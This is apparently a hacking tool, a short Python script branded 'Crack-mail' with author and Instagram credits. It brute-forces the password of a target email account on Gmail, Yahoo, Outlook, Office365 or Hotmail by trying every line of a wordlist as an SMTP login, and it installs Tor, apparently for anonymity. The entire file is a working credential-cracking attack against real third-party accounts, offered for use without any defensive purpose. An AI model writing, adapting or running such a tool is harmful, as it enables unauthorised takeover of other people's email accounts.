import smtplib
import os
from time import sleep
os.system('apt install tor')
os.system('clear')
print('start tor service in your new terminal/sesion')
sleep(5)
os.system('clear')

print('_________                       __                            .__.__   ')
print('\_   ___ \____________    ____ |  | __           _____ _____  |__|  |  ')
print('/    \  \/\_  __ \__  \ _/ ___\|  |/ /  ______  /     \\__  \ |  |  |  ')
print('\     \____|  | \// __ \\  \___|    <  /_____/ |  Y Y  \/ __ \|  |  |__')
print(' \______  /|__|  (____  /\___  >__|_ \         |__|_|  (____  /__|____/')
print('        \/            \/     \/     \/               \/     \/         ')
print()
print('Author    ————› King')
print('Instagram ————› @the.empiresec')
print('github    ————› http://www.github.com/theEmpireSec')
print('—'*63)
print('1 ————› gmail')
print('2 ————› yahoo')
print('3 ————› outlook')
print('4 ————› office365')
print('5 ————› hotmail')
choice=input('Enter option no. ————› ')
if choice=='1':
	server=smtplib.SMTP('smtp.gmail.com',587)
	server.ehlo()
	server.starttls()
elif choice=='2':
	server=smtplib.SMTP('smtp.mail.yahoo.com',587)
	server.ehlo()
	server.starttls()
elif choice=='3':
	server=smtplib.SMTP('smtp-mail.outlook.com',587)
	server.ehlo()
	server.starttls()
elif choice=='4':
	server=smtplib.SMTP('smtp.office365.com',587)
	server.ehlo()
	server.starttls()
elif choice=='5':
	server=smtplib.SMTP('smtp.live.com',587)
	server.ehlo()
	server.starttls()
else:
	print('Invalid option')
print()
mail=input('Enter mail id of target ————› ')
print()
file=input('Enter wordlist path ————› ')
try:
	file=open(file,'r')
except:
	print('File not found ')
for paswd in file:
	try:
		server.login(mail,paswd)
		print('Password found ————› '+paswd)
		break
	except smtplib.SMTPAuthenticationError:

		print('Incorrect password ————› ',paswd)

